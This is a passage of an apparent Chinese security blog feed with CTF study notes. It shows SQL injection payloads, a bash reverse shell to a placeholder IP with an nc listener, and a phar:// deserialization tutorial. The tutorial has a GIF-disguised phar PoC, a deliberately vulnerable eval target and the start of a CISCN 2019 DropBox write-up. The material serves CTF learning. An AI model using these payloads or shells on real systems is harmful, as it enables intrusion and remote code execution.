class="number">1</span>)=<span class="string">'%s'</span>  <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^(1)^1<span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><p><strong>union_md5()</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin' union <span class="keyword">select</span> <span class="number">1</span>,ma5(<span class="number">1</span>) %<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="反弹shelll"><a href="#反弹shelll" class="headerlink" title="反弹shelll"></a>反弹shelll</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPS：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令执行点：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>比赛总是自闭，继续加油吧= =</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;打比赛的时候一个变量覆盖看了半天，还是队里师傅提醒用php://input，发现自己基础很弱，于是把基础平台的Web刷了一遍，记录下一些有价
      
    
    </summary>
    
    
    
      <category term="Web" scheme="https://www.sketchplane.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>phar://反序列化再学习</title>
    <link href="https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/"/>
    <id>https://www.sketchplane.top/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/</id>
    <published>2019-08-26T13:21:52.000Z</published>
    <updated>2019-08-27T03:20:43.558Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天复现时发现自己关于phar反序列化了解得不够，特地记录一下加深印象。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h3><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><h3 id="phar文件组成"><a href="#phar文件组成" class="headerlink" title="phar文件组成"></a>phar文件组成</h3><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164942-210cf44c-b344-1.png" alt=""></p><p><strong>这里重点关注箭头部分，它会以序列化的形式储存用户自定义的meta-data，这也是我们利用的核心。</strong></p><h3 id="触发反序列化方式"><a href="#触发反序列化方式" class="headerlink" title="触发反序列化方式"></a>触发反序列化方式</h3><p>既然.phar文件中存在可控的序列化内容，为了重写对象我们自然要想办法让它反序列化，在php中大部分系统函数在通过<code>phar://</code>伪协议解析phar文件时，会将<code>meta-data</code>反序列化：</p><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180908164943-2151deae-b344-1.png" alt=""></p><p><strong>也就是说，当存在file_get_contents($_GET[‘filename’])类似函数的时候，meta-data中的内容会自行反序列化，不需要反序列化函数，这也是phar反序列化的一个优点。</strong></p><h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>首先我们需要生成一个.phar文件，php中存在Phar类实现相关操作。</p><p><strong>注意：要生成.phar文件，需要先将php.ini中的phar.readonly设置成Off，并将前面的;去掉(php5.2没有该配置项)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phar.php =&gt; 生成phar.phar</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line"></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();  <span class="comment">// **TestObject类 根据需要修改**</span></span><br><span class="line">    $o -&gt; data=<span class="string">'hu3sky'</span>;</span><br><span class="line"></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_unser.php =&gt; 自动反序列化重写对象</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问phar.php生成phar.phar，因为这里包含了phar.phar，直接访问phar_unser.php，成功输出构造内容：</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbPnJD.png" alt=""></p><h2 id="phar文件上传绕过"><a href="#phar文件上传绕过" class="headerlink" title="phar文件上传绕过"></a>phar文件上传绕过</h2><p>之前提到过<strong>phar拓展通过结尾的<code>__HALT_COMPILER();?&gt;</code>来识别是否为phar文件，与之前的内容和后缀名都无关。</strong>于是我们可以通过添加文件头+修改文件后缀来绕过一些文件类型限制。比较常见的是伪装成GIF图片。</p><p>首先我们搭建一个漏洞环境，限制只允许上传gif类型图片，然后再写一个有析构函数的可以利用的类：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//upload_file.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--upload_file.html--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"./upload_file.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"Upload"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//file_un.php 可利用的代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($filename); <span class="comment">//函数解析phar://伪协议时自动反序列化</span></span><br></pre></td></tr></table></figure><p><strong>注意：没有<code>file_exist($filename)</code>去解析伪协议（或者类似函数，上文有提到）是不会自动反序列化的。</strong></p><p>然后根据上面可利用的代码编写PoC（这个框架用得很多）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//类到底是什么根据情况自行修改</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnyClass</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $output = <span class="string">'echo "ok";'</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span> -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//类的属性要怎么写根据情况自行修改</span></span><br><span class="line">$object = <span class="keyword">new</span> AnyClass();</span><br><span class="line">$object -&gt; output= <span class="string">'phpinfo();'</span>;</span><br><span class="line"></span><br><span class="line">$phar -&gt; setMetadata($object);</span><br><span class="line">$phar -&gt; stopBuffering();</span><br></pre></td></tr></table></figure><p>利用<code>phar://</code>伪协议访问相应文件成功执行<code>phpinfo()</code>命令：</p><p><img src="https://t1.picb.cc/uploads/2019/08/26/gbPclW.png" alt=""></p><h2 id="PHP反序列化再巩固"><a href="#PHP反序列化再巩固" class="headerlink" title="PHP反序列化再巩固"></a>PHP反序列化再巩固</h2><p>我理解的PHP应该是：向用户可控的unserialize()函数中，传入一个含有析构函数的类的对象的序列化字符串（通常是精心构造的），使其反序列化为对象之后执行析构函数，达到我们的一些目的。</p><h2 id="CISCN-2019-DropBox"><a href="#CISCN-2019-DropBox" class="headerlink" title="CISCN 2019 DropBox"></a>CISCN 2019 DropBox</h2><p>首先通过抓包fuzz，发现存在任意文件下载漏洞， 把源码下载下来。</p><p>这里主要看delete.php和class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单看<code>delete.php</code>发现不了什么，只是一个简单的删除文件功能，这里注意到<code>$filename</code>是我们可控的，另外新建了$file的对象，调用了open()函数；接着看<code>class.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$dbaddr = <span class="string">"127.0.0.1"</span>;</span><br><span class="line">$dbuser = <span class="string">"root"</span>;</span><br><span class="line">$dbpass = <span class="string">"root"</span>;</span><br><span class="line">$dbname = <span class="string">"dropbox"</span>;</span><br><span class="line">$db = <span class="keyword">new</span> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count = $stmt-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> ($count === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"ss"</span>, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist($username)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $password = sha1($password . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        $stmt = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span>);</span><br><span class="line">        $stmt-&gt;bind_param(<span class="string">"s"</span>, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($expect) &amp;&amp; $expect === $password) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span 